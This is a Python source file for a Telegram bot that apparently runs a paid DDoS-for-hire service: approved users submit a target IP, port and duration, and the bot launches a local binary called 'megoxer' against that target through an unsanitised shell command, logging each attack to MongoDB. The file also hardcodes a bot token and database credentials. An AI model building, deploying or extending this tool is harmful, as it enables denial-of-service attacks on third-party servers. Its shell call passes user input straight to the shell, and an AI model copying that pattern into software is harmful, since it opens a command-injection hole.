import os
import time
import telebot
import datetime
import subprocess
import threading
from telebot import types
from pymongo import MongoClient

# Insert your Telegram bot token here
bot = telebot.TeleBot('7312425800:AAFpEzQyNniQJ8CWwsdC99mgPN8B3klnS_c')

# MongoDB Connection
MONGO_URI = "mongodb+srv://megoxer:megoxer@megoxer.qmo4h.mongodb.net/?retryWrites=true&w=majority&appName=megoxer"
client = MongoClient(MONGO_URI)
db = client["megoxer_bot"]  # Database name
users_collection = db["users"]  # Collection for users
logs_collection = db["logs"]  # Collection for logs

# Admin user IDs
admin_id = {"7469108296"}

# Attack cooldown per user
COOLDOWN_PERIOD = 300

# In-memory storage
last_attack_time = {}

# MongoDB Helper Functions
def is_user_allowed(user_id):
    """Check if a user is in the allowed users list."""
    return users_collection.find_one({"user_id": user_id}) is not None

def add_allowed_user(user_id):
    """Add a user to the allowed users list."""
    if not is_user_allowed(user_id):
        users_collection.insert_one({"user_id": user_id})

def remove_allowed_user(user_id):
    """Remove a user from the allowed users list."""
    users_collection.delete_one({"user_id": user_id})

def get_all_allowed_users():
    """Retrieve all allowed users."""
    return list(users_collection.find())

def log_command_to_db(user_id, command, target=None, port=None, duration=None):
    """Log a command in the database."""
    logs_collection.insert_one({
        "user_id": user_id,
        "command": command,
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": datetime.datetime.now()
    })

def clear_logs_from_db():
    """Clear all logs from the database."""
    logs_collection.delete_many({})

def get_logs():
    """Retrieve all logs from the database."""
    return list(logs_collection.find())

# Telegram Bot Handlers
@bot.message_handler(commands=['add'])
def add_user(message):
    """Admin command to add a user to the allowed list."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        parts = message.text.split()
        if len(parts) == 2:
            user_to_add = parts[1]
            add_allowed_user(user_to_add)
            response = f"✅ 𝗨𝘀𝗲𝗿 {user_to_add} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁."
        else:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: `/add <user_id>`"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Admin command to remove a user from the allowed list."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        parts = message.text.split()
        if len(parts) == 2:
            user_to_remove = parts[1]
            if is_user_allowed(user_to_remove):
                remove_allowed_user(user_to_remove)
                response = f"✅ 𝗨𝘀𝗲𝗿 {user_to_remove} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁."
            else:
                response = f"❌ 𝗨𝘀𝗲𝗿 {user_to_remove} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁."
        else:
            response = "𝗨𝘀𝗲: `/𝗿𝗲𝗺𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱>`"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_logs(message):
    """Admin command to show logs."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        logs = get_logs()
        if logs:
            response = "📜 Logs:\n\n" + "\n".join(
                f"UserID: {log['user_id']}, Target: {log.get('target')}, Port: {log.get('port')}, Time: {log.get('duration')}s, Timestamp: {log['timestamp']}"
                for log in logs
            )
        else:
            response = "❌ No logs found."
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clear_logs'])
def clear_logs(message):
    """Admin command to clear all logs."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        clear_logs_from_db()
        response = "✅ 𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆."
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if is_user_allowed(user_id):
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁. 𝗪𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
                bot.reply_to(message, response)
                return
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗣, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀) 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲."
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)
    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) == 3:
        target, port, duration = details
        try:
            port = int(port)
            duration = int(duration)
            if duration > 240:
                response = "❗️𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗮𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                log_command_to_db(user_id, "attack", target, port, duration)
                username = message.chat.username or "No username"
                response = (
                    f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
                    f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
                    f"𝗧𝗶𝗺𝗲: {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
                )
                last_attack_time[user_id] = datetime.datetime.now()

                # Start the attack process
                subprocess.Popen(f"./megoxer {target} {port} {duration}", shell=True)

                # Notify the user when the attack is complete
                threading.Thread(target=notify_attack_finished, args=(message, duration)).start()
        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: `<𝘁𝗮𝗿𝗴𝗲𝘁> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>`"
    bot.reply_to(message, response)
    
def notify_attack_finished(message, duration):
    """Notify the user after the attack is completed."""
    time.sleep(duration)  # Wait for the attack duration
    bot.reply_to(message, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 ✅")

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    markup.add(attack_button, myinfo_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗺𝗲𝗴𝗼𝘅𝗲𝗿 𝗯𝗼𝘁!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    """Provide user information, including role and access status."""
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "User"
    status = "Active ✅" if is_user_allowed(user_id) else "Inactive ❌"

    # Format the response with styled text
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🔖 𝗥𝗼𝗹𝗲: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
    )

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def show_allowed_users(message):
    """Admin command to show all allowed users with their usernames."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Fetch all allowed users from the database
        allowed_users = get_all_allowed_users()
        if allowed_users:
            response = "👥 AUTHORIZED USERS 👥\n\n"
            for user in allowed_users:
                try:
                    user_info = bot.get_chat(user['user_id'])
                    username = f"@{user_info.username}" if user_info.username else "No username"
                    response += f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: `{user['user_id']}`\n𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n\n"
                except Exception as e:
                    response += f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: `{user['user_id']}`\n𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: Error ({e})\n\n"
        else:
            response = "No authorized users found."
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response, parse_mode="Markdown")

if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
        time.sleep(3)